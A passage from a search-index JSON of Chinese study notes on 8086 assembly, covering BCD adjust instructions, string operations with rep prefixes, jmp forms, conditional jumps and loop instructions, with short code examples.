\u4e0e\u7ed3\u679c\u6700\u9ad8\u4f4d\u7684\u5f02\u6216</li> </ul> OF DF IF TF SF ZF AF PF CF rcr <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1arcr dest, count</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5e26\u8fdb\u4f4d\u5faa\u73af\u53f3\u79fb\uff0c\u5373 cf \u52a0\u5728 dest \u53f3\u4fa7\u4e00\u8d77\u5faa\u73af\u53f3\u79fb</li> <li>\u6ce8\u610f\uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09\u3002\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1 \u65f6\uff0cof undefined\uff0c\u5426\u5219 of \u4e3a\u4e24\u4e2a\u6700\u9ad8\u4f4d\u7684\u5f02\u6216</li> </ul> OF DF IF TF SF ZF AF PF CF"},{"location":"cs/pl/asm/#_20","title":"\u5341\u8fdb\u5236\u8c03\u6574\u6307\u4ee4","text":"<p>BCD \u7801\u662f\u4f7f\u7528\u4e8c\u8fdb\u5236\u7f16\u7801\u5341\u8fdb\u5236\u6570\uff0c\u53ef\u4ee5\u5206\u4e3a\u538b\u7f29 BCD \u7801\u548c\u975e\u538b\u7f29 BCD \u7801</p>"},{"location":"cs/pl/asm/#bcd","title":"\u538b\u7f29 BCD \u7801\u8c03\u6574\u6307\u4ee4","text":"<p>\u538b\u7f29 BCD \u7801\u5373\u662f\u4f7f\u7528 4 \u4e2a\u4e8c\u8fdb\u5236\u4f4d\u8868\u793a 1 \u4e2a\u5341\u8fdb\u5236\u6570\uff0c\u5982 37h \u8868\u793a 37\u3002\u4e0e\u8fd9\u4e9b\u6307\u4ee4\u76f8\u5173\u7684\u662f af \u6807\u5fd7\uff0c\u5b83\u5728\u52a0\u51cf\u6cd5\u65f6\u5982\u679c\u4f4e\u56db\u4f4d\u548c\u9ad8\u56db\u4f4d\u95f4\u53d1\u751f\u4e86\u5341\u516d\u8fdb\u5236\u8fdb\u4f4d\u5219\u53d8\u4e3a 1\u3002\u56e0\u6b64\u4e5f\u4f1a\u6b63\u597d\u5dee 6\uff0cdaa das \u4f5c\u7528\u5219\u662f\u5c06\u8fd9\u4e2a 6 \u8c03\u6574\u56de\u6765\uff0c\u4f7f\u7ed3\u679c\u7ee7\u7eed\u4e3a\u538b\u7f29 BCD \u7801</p> daa <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1adaa</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5728 al \u88ab\u505a\u52a0\u6cd5\u540e\u5c06\u7ed3\u679c al \u8c03\u6574\u4e3a BCD \u7801<ul> <li>if (af == 1 || (al&amp;0Fh) &gt; 9) al += 6, af = 1; else af = 0</li> <li>if (cf == 1 || al &gt; 9Fh) al += 60h, cf = 1; else cf = 0</li> </ul> </li> </ul> OF DF IF TF SF ZF AF PF CF das <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1adas</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5728 al \u88ab\u505a\u51cf\u6cd5\u540e\u5c06\u7ed3\u679c al \u8c03\u6574\u4e3a BCD \u7801<ul> <li>if (af == 1 || (al&amp;0Fh) &gt; 9) al -= 6, af = 1; else af = 0</li> <li>if (cf == 1 || al &gt; 9Fh) al -= 60h, cf = 1; else cf = 0</li> </ul> </li> </ul> OF DF IF TF SF ZF AF PF CF"},{"location":"cs/pl/asm/#bcd_1","title":"\u975e\u538b\u7f29 BCD \u7801\u8c03\u6574\u6307\u4ee4","text":"<p>\u975e\u538b\u7f29 BCD \u7801\u4f7f\u7528 8 \u4e2a\u4e8c\u8fdb\u5236\u4f4d\u8868\u793a 1 \u4e2a\u5341\u8fdb\u5236\u4f4d\uff0c\u5176\u4e2d\u9ad8 4 \u4f4d\u6ca1\u6709\u610f\u4e49\uff0c\u6bd4\u5982 06h 16h 26h \u5747\u8868\u793a\u5341\u8fdb\u5236\u6570 6</p> aaa <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aaaa</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u52a0\u6cd5\u7684 ASCII \u8c03\u6574\uff0c\u5728 al \u88ab\u505a\u52a0\u6cd5\u540e\u8fde\u5e26 ah \u4e00\u8d77\u8c03\u6574 ax \u4e3a\u975e\u538b\u7f29 BCD \u7801<ul> <li>if (af == 1 || (al&amp;0Fh) &gt; 9) al = (al+6)&amp;0Fh, ah += 1, af = 1, cf = 1</li> <li>else af = 0, cf = 0</li> </ul> </li> </ul> OF DF IF TF SF ZF AF PF CF \u4f8b <pre><code>mov ah, 0\nmov al, '8'   ; al = 38h\nadd al, '9'   ; al = 38h + 39h = 71h, af = 1, cf = 0\naaa           ; ax = 0107h \u5373 17\n\nmov ax, 0505h ; 55\nadd al, 9     ; al = 0Eh, af = 0, cf = 0\naaa           ; ax = 0604h \u5373 64\n</code></pre> aas <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aaas</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u51cf\u6cd5\u7684 ASCII \u8c03\u6574\uff0c\u5728 al \u88ab\u505a\u51cf\u6cd5\u540e\u8fde\u5e26 ah \u4e00\u8d77\u8c03\u6574 ax \u4e3a\u975e\u538b\u7f29 BCD \u7801<ul> <li>if (af == 1 || (af&amp;0Fh) &gt; 9) al = (al-6)&amp;0Fh, ah -= 1, af = 1, cf = 1</li> <li>else af = 0, cf = 0</li> </ul> </li> </ul> OF DF IF TF SF ZF AF PF CF \u4f8b <pre><code>mov ax, 0201h  ; 21\nsub al, 9      ; al = 0F8h, af = 1, cf = 1\naas            ; ax = 0102h \u5373 12\n\nmov ax, 0335h  ; 35\nsub al, 38h    ; (\u51cf 8) al = 0FDh, af = 1, cf = 1\naas            ; ax = 0207h \u5373 27\n</code></pre> aam <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aaam</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4e58\u6cd5\u7684 ASCII \u8c03\u6574\uff0c\u5728 al \u88ab\u505a\u4e58\u6cd5\u540e\u5bf9\u5176\u505a\u8c03\u6574<ul> <li>ah = al / 10, al = al % 10</li> </ul> </li> </ul> OF DF IF TF SF ZF AF PF CF \u4f8b <pre><code>mov al, 3\nmov bl, 4\nmul bl    ; ax = 000Ch\naam       ; ax = 0102h \u5373 12\n</code></pre> aad <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aaad</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u9664\u6cd5\u7684 ASCII \u8c03\u6574\uff0c\u5728 ax \u88ab\u505a\u9664\u6cd5\u524d\u5bf9\u5176\u8fdb\u884c\u8c03\u6574\uff0c\u4f7f\u9664\u6cd5\u7ed3\u679c\u4e3a BCD \u7801<ul> <li>al = ah * 10 + al, ah = 0</li> </ul> </li> </ul> OF DF IF TF SF ZF AF PF CF \u4f8b <pre><code>mov ax, 0105h  ; 15\nmov cl, 4\naad            ; ax = 000Fh\ndiv cl         ; al = 03h, ah = 03h\n</code></pre>"},{"location":"cs/pl/asm/#_21","title":"\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4","text":"<p>\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u5206\u4e3a movs \u5b57\u7b26\u4e32\u4f20\u9001\u3001cmps \u5b57\u7b26\u4e32\u6bd4\u8f83\u3001scas \u5b57\u7b26\u4e32\u626b\u63cf\u3001stos \u5b58\u5165\u5b57\u7b26\u4e32\u3001lods \u4ece\u5b57\u7b26\u4e32\u53d6\u4e94\u79cd\uff0c\u5b83\u4eec\u90fd\u53ef\u4ee5\u63a5\u4e00\u4e2a\u6307\u4ee4\u524d\u7f00\u3002\u5982\u679c\u4e0d\u63a5\u524d\u7f00\uff0c\u5219\u53ea\u6267\u884c\u4e00\u6b21\uff0c\u5982\u679c\u63a5\u524d\u7f00\uff0c\u5219\u91cd\u590d\u6267\u884c\u3002lods \u6307\u4ee4\u4e0d\u5e38\u7528\u524d\u7f00</p> \u524d\u7f00 rep <ul> <li>\u4f5c\u7528\uff1a\u628a\u540e\u9762\u7684\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u91cd\u590d cx \u6b21</li> <li>\u6ce8\u610f\uff1acx \u9700\u8981\u63d0\u524d\u8bbe\u7f6e\uff0c\u4e00\u822c\u4e0d\u63a5 cmps scas</li> </ul> \u524d\u7f00 repe / repz <ul> <li>\u4f5c\u7528\uff1a\u6700\u591a\u91cd\u590d cx \u6b21\uff0c\u4e14\u4ec5\u5f53\u6bd4\u8f83\u76f8\u7b49\u65f6\u7ee7\u7eed\u91cd\u590d</li> <li>\u6ce8\u610f\uff1acx \u9700\u8981\u63d0\u524d\u8bbe\u7f6e\uff0c\u4e0d\u80fd\u7528\u5728 movs stos \u4e0a</li> </ul> \u524d\u7f00 repne / repnz <ul> <li>\u4f5c\u7528\uff1a\u6700\u591a\u91cd\u590d cx \u6b21\uff0c\u4e14\u4ec5\u5f53\u6bd4\u8f83\u4e0d\u76f8\u7b49\u65f6\u7ee7\u7eed\u91cd\u590d</li> <li>\u6ce8\u610f\uff1acx \u9700\u8981\u63d0\u524d\u8bbe\u7f6e\uff0c\u4e0d\u80fd\u7528\u5728 movs stos \u4e0a</li> </ul>"},{"location":"cs/pl/asm/#_22","title":"\u5b57\u7b26\u4e32\u4f20\u9001\u6307\u4ee4","text":"movsb <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1amovsb / rep movsb</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u4ece ds:[si] \u4f20\u9001\u6570\u636e\u5230 es:[di]\uff0c\u5e76\u79fb\u52a8 si di</li> <li>\u6ce8\u610f\uff1asi di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a</li> </ul> movsw <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1amovsw / rep movsw</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4ee5\u5b57\u4e3a\u5355\u4f4d\u4ece ds:[si] \u4f20\u9001\u6570\u636e\u5230 es:[di]\uff0c\u5e76\u79fb\u52a8 si di</li> <li>\u6ce8\u610f\uff1asi di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a</li> </ul> movs <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a<ul> <li>(rep) movs byte ptr es:[di], byte ptr seg:[si]</li> <li>(rep) movs word ptr es:[di], word ptr seg:[si]</li> </ul> </li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4ee5\u5b57\u8282/\u5b57\u4e3a\u5355\u4f4d\u4ece seg:[si] \u4f20\u9001\u6570\u636e\u5230 es:[di]\uff0c\u5e76\u79fb\u52a8 si di</li> <li>\u6ce8\u610f\uff1aseg \u53ef\u4ee5\u662f cs ds es ss \u4e2d\u4efb\u610f\u4e00\u4e2a\uff0c\u5f53 seg \u4e3a ds \u65f6\u4e0e movsb/movsw \u7b49\u4ef7\u3002si di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282/\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a</li> </ul>"},{"location":"cs/pl/asm/#_23","title":"\u5b57\u7b26\u4e32\u6bd4\u8f83\u6307\u4ee4","text":"cmpsb <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1acmpsb / repe cmpsb / repne cmpsb</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u6bd4\u8f83\u5b57\u8282 ds:[si] \u4e0e es:[di]\uff0c\u5373 byte ptr ds:[si] - byte ptr es:[di] \u4e22\u5f03\u7ed3\u679c\u4fdd\u7559\u6807\u5fd7\u4f4d\uff0c\u5e76\u79fb\u52a8 si di</li> <li>\u6ce8\u610f\uff1asi di \u7684\u79fb\u52a8\u4e0d\u4f1a\u5f71\u54cd\u6807\u5fd7\u4f4d\u3002si di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a</li> </ul> OF DF IF TF SF ZF AF PF CF cmpsw <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1acmpsw / repe cmpsw / repne cmpsw</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u6bd4\u8f83\u5b57 ds:[si] \u4e0e es:[di]\uff0c\u5373 word ptr ds:[si] - word ptr es:[di] \u4e22\u5f03\u7ed3\u679c\u4fdd\u7559\u6807\u5fd7\u4f4d\uff0c\u5e76\u79fb\u52a8 si di</li> <li>\u6ce8\u610f\uff1asi di \u7684\u79fb\u52a8\u4e0d\u4f1a\u5f71\u54cd\u6807\u5fd7\u4f4d\u3002si di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a</li> </ul> OF DF IF TF SF ZF AF PF CF cmps <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a<ul> <li>(repe/repne) cmps byte ptr seg:[si], byte ptr es:[di]</li> <li>(repe/repne) cmps word ptr seg:[si], word ptr es:[di]</li> </ul> </li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u6bd4\u8f83\u5b57\u8282/\u5b57 seg:[si] \u4e0e es:[di]\uff0c\u5373\u5de6\u51cf\u53f3\u4e22\u5f03\u7ed3\u679c\u4fdd\u7559\u6807\u5fd7\u4f4d\uff0c\u5e76\u79fb\u52a8 si di</li> <li>\u6ce8\u610f\uff1aseg \u53ef\u4ee5\u662f cs ds es ss \u4e2d\u4efb\u610f\u4e00\u4e2a\u3002si di \u7684\u79fb\u52a8\u4e0d\u4f1a\u5f71\u54cd\u6807\u5fd7\u4f4d\u3002si di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282/\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a</li> </ul> OF DF IF TF SF ZF AF PF CF"},{"location":"cs/pl/asm/#_24","title":"\u5b57\u7b26\u4e32\u626b\u63cf\u6307\u4ee4","text":"scasb <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ascasb / repe scasb / repne scasb</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u6bd4\u8f83 al \u4e0e es:[di]\uff0c\u5373\u8ba1\u7b97 al - es:[di] \u4e22\u5f03\u7ed3\u679c\u4fdd\u7559\u7b26\u53f7\u4f4d\uff0c\u5e76\u79fb\u52a8 di</li> <li>\u6ce8\u610f\uff1adi \u7684\u79fb\u52a8\u4e0d\u4f1a\u5f71\u54cd\u6807\u5fd7\u4f4d\u3002di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a</li> </ul> OF DF IF TF SF ZF AF PF CF scasw <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ascasw / repe scasw / repne scasw</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u6bd4\u8f83 ax \u4e0e es:[di]\uff0c\u5373\u8ba1\u7b97 ax - es:[di] \u4e22\u5f03\u7ed3\u679c\u4fdd\u7559\u7b26\u53f7\u4f4d\uff0c\u5e76\u79fb\u52a8 di</li> <li>\u6ce8\u610f\uff1adi \u7684\u79fb\u52a8\u4e0d\u4f1a\u5f71\u54cd\u6807\u5fd7\u4f4d\u3002di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a</li> </ul> OF DF IF TF SF ZF AF PF CF"},{"location":"cs/pl/asm/#_25","title":"\u5b58\u5165\u5b57\u7b26\u4e32\u6307\u4ee4","text":"stosb <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1astosb / rep stosb</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u628a\u5b57\u8282 al \u5b58\u5165 es:[di] \u4e2d\uff0c\u5e76\u79fb\u52a8 di</li> <li>\u6ce8\u610f\uff1adi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a</li> </ul> stosw <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1astosw / rep stosw</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u628a\u5b57 ax \u5b58\u5165 es:[di] \u4e2d\uff0c\u5e76\u79fb\u52a8 di</li> <li>\u6ce8\u610f\uff1adi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a</li> </ul>"},{"location":"cs/pl/asm/#_26","title":"\u4ece\u5b57\u7b26\u4e32\u53d6\u6307\u4ee4","text":"lodsb <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1alodsb</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4ece ds:[si] \u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\u5b58\u5165 al\uff0c\u5e76\u79fb\u52a8 si</li> <li>\u6ce8\u610f\uff1asi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a</li> </ul> lodsw <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1alodsw</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4ece ds:[si] \u8bfb\u53d6\u4e00\u4e2a\u5b57\u5b58\u5165 ax\uff0c\u5e76\u79fb\u52a8 si</li> <li>\u6ce8\u610f\uff1asi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a</li> </ul> lods <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a<ul> <li>lods byte ptr seg:[si]</li> <li>lods word ptr seg:[si]</li> </ul> </li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4ece seg:[si] \u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282/\u5b57\u5b58\u5165 al/ax\uff0c\u5e76\u79fb\u52a8 si</li> <li>\u6ce8\u610f\uff1aseg \u53ef\u4ee5\u662f cs ds es ss \u4e2d\u4efb\u610f\u4e00\u4e2a\u3002si \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282/\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a</li> </ul>"},{"location":"cs/pl/asm/#_27","title":"\u63a7\u5236\u8f6c\u79fb\u6307\u4ee4","text":""},{"location":"cs/pl/asm/#_28","title":"\u65e0\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4","text":"<p>\u65e0\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4 jmp \u6709\u4e09\u79cd\u5f62\u5f0f\uff0c\u5373\u77ed\u8df3\u3001\u8fd1\u8df3\u3001\u8fdc\u8df3\uff0c\u5176\u64cd\u4f5c\u7801\u548c\u64cd\u4f5c\u6570\u5747\u4e0d\u540c</p> jmp \u77ed\u8df3 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ajmp dest / jmp short dest</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 ip \u6307\u9488\u8d4b\u503c\u4e3a dest\uff0c\u5373\u8df3\u8f6c\u5230 dest</li> <li>\u6ce8\u610f\uff1adest \u53ea\u80fd\u4e3a\u7acb\u5373\u6570\uff0c\u4e14\u76ee\u6807\u5730\u5740 dest \u4e0e\u4e0b\u6761\u6307\u4ee4\u7684\u504f\u79fb\u5730\u5740\u4e4b\u95f4\u8ddd\u79bb\u5728\u8303\u56f4 [-128, 127] \u5185\u3002\u4f1a\u7f16\u7801\u4e3a\u4e24\u5b57\u8282\uff08EBxx\uff0c\u540e\u4e24\u4f4d\u4e3a\u8ddd\u79bb\uff09</li> </ul> jmp \u8fd1\u8df3 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ajmp dest</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 ip \u6307\u9488\u8d4b\u503c\u4e3a dest\uff0c\u5373\u8df3\u8f6c\u5230 dest</li> <li>\u6ce8\u610f\uff1adest \u4e3a\u7acb\u5373\u6570\u6216\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0c\u5982\u679c\u662f\u7acb\u5373\u6570\u5219\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u4e4b\u95f4\u8ddd\u79bb\u5728 [-32768, 32767] \u5185\u3002\u4f1a\u7f16\u7801\u4e3a\u4e09\u5b57\u8282</li> </ul> jmp \u8fdc\u8df3 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ajmp dest</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 cs:ip \u8d4b\u503c\u4e3a dest\uff0c\u5373\u8df3\u8f6c\u5230 dest</li> <li>\u6ce8\u610f\uff1acs \u4e5f\u4f1a\u6539\u53d8\uff0cdest \u53ef\u4ee5\u662f\u7acb\u5373\u6570\u6216\u5185\u5b58\uff0c\u5982\u679c\u662f\u7acb\u5373\u6570\u8981\u5199\u6210 \u6bb5\u5730\u5740:\u504f\u79fb\u5730\u5740 \u7684\u5f62\u5f0f\uff0c\u5982\u679c\u662f\u5185\u5b58\u5219\u5b58\u50a8\u7684\u7b2c\u4e00\u4e2a\u5b57\u8868\u793a\u504f\u79fb\u5730\u5740\u3001\u7b2c\u4e8c\u4e2a\u5b57\u8868\u793a\u6bb5\u5730\u5740</li> </ul>"},{"location":"cs/pl/asm/#_29","title":"\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4","text":"jcc \u7c7b\u6307\u4ee4 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ajcc dest</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5982\u679c\u4e0e\u6807\u5fd7\u4f4d\u6709\u5173\u7684\u6761\u4ef6 cc \u6210\u7acb\uff0c\u5219\u4ee4 ip \u7b49\u4e8e dest\uff0c\u5373\u8df3\u8f6c\u5230 dest</li> <li>\u6ce8\u610f\uff1a\u8fd9\u4e9b\u8df3\u8f6c\u90fd\u662f\u77ed\u8df3\uff0c\u9700\u8981\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u8ddd\u79bb\u5728 [-128, 127] \u5185</li> </ul> \u6240\u6709\u6b64\u7c7b\u6307\u4ee4\u53ca\u6761\u4ef6 \u6307\u4ee4 \u610f\u4e49 \u6761\u4ef6 \u5907\u6ce8 jz \u7b49\u4e8e\u96f6\u5219\u8df3 zf=1 \u7b49\u4ef7\u4e8e je jnz \u4e0d\u7b49\u4e8e\u96f6\u5219\u8df3 zf=0 \u7b49\u4ef7\u4e8e jne jc \u6709\u8fdb\u4f4d\u5219\u8df3 cf=1 \u7b49\u4ef7\u4e8e jb jnae jnc \u65e0\u8fdb\u4f4d\u5219\u8df3 cf=0 \u7b49\u4ef7\u4e8e jnb jae js \u6709\u7b26\u53f7\u4f4d\u5219\u8df3 sf=1 jns \u65e0\u7b26\u53f7\u4f4d\u5219\u8df3 sf=0 jo \u6709\u6ea2\u51fa\u4f4d\u5219\u8df3 of=1 jno \u65e0\u6ea2\u51fa\u4f4d\u5219\u8df3 of=0 jp/jpe \u6709\u5947\u5076\u4f4d\u5219\u8df3 pf=1 jnp/jpo \u65e0\u5947\u5076\u4f4d\u5219\u8df3 pf=0 ja/jnbe \u65e0\u7b26\u53f7\u5927\u4e8e\u5219\u8df3 cf=0 and zf=0 jae/jnb \u65e0\u7b26\u53f7\u5927\u4e8e\u7b49\u4e8e\u5219\u8df3 cf=0 \u7b49\u4ef7\u4e8e jnc jb/jae \u65e0\u7b26\u53f7\u5c0f\u4e8e\u5219\u8df3 cf=1 \u7b49\u4ef7\u4e8e jc jbe/jna \u65e0\u7b26\u53f7\u5c0f\u4e8e\u7b49\u4e8e\u5219\u8df3 cf=1 or zf=1 jg/jnle \u6709\u7b26\u53f7\u5927\u4e8e\u5219\u8df3 sf=of and zf=0 jge/jnl \u6709\u7b26\u53f7\u5927\u4e8e\u7b49\u4e8e\u5219\u8df3 sf=of jl/jnge \u6709\u7b26\u53f7\u5c0f\u4e8e\u5219\u8df3 sf!=of jle/jng \u6709\u7b26\u53f7\u5c0f\u4e8e\u7b49\u4e8e\u5219\u8df3 sf!=of or zf=1 je \u76f8\u7b49\u5219\u8df3 zf=1 \u7b49\u4ef7\u4e8e jz jne \u4e0d\u76f8\u7b49\u5219\u8df3 zf=0 \u7b49\u4ef7\u4e8e jnz jcxz <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ajcxz dest</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5982\u679c cx \u7b49\u4e8e\u96f6\u5219\u4ee4 ip \u7b49\u4e8e dest \u5373\u8df3\u8f6c\u5230 dest</li> <li>\u6ce8\u610f\uff1a\u5c5e\u4e8e\u77ed\u8df3\uff0c\u9700\u8981\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u8ddd\u79bb\u5728 [-128, 127] \u5185</li> </ul>"},{"location":"cs/pl/asm/#_30","title":"\u5faa\u73af\u6307\u4ee4","text":"loop <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aloop dest</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1acx \u8868\u793a\u5faa\u73af\u6b21\u6570\uff0ccx \u5148\u51cf 1\uff0c\u5982\u679c cx \u4e0d\u4e3a 0 \u5219\u8df3\u8f6c\u5230 dest</li> <li>\u6ce8\u610f\uff1adest \u662f\u7acb\u5373\u6570\uff0cloop \u5c5e\u4e8e\u77ed\u8df3\uff0c\u9700\u8981\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u8ddd\u79bb\u5728 [-128, 127] \u5185</li> </ul> loopz <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aloopz dest</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5982\u679c\u7b49\u4e8e\u96f6\u5219\u5faa\u73af\uff0c\u5148 cx \u51cf 1\uff08\u6b64\u5904\u4e0d\u5f71\u54cd\u6807\u5fd7\u4f4d\uff09\uff0c\u7136\u540e\u5982\u679c cx != 0 \u4e14 zf == 1 \u5219\u8df3\u8f6c\u5230 dest</li> <li>\u6ce8\u610f\uff1adest \u662f\u7acb\u5373\u6570\uff0cloopz \u5c5e\u4e8e\u77ed\u8df3\uff0c\u9700\u8981\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u8ddd\u79bb\u5728 [-128, 127] \u5185</li> </ul> loope <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aloope dest</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5982\u679c\u76f8\u7b49\u5219\u5faa\u73af</li> <li>\u6ce8\u610f\uff1a\u5b8c\u5168\u7b49\u4ef7\u4e8e loopz</li> </ul> loopnz <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aloopnz dest</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5982\u679c\u4e0d\u7b49\u4e8e\u96f6\u5219\u5faa\u73af\uff0c\u5148 cx 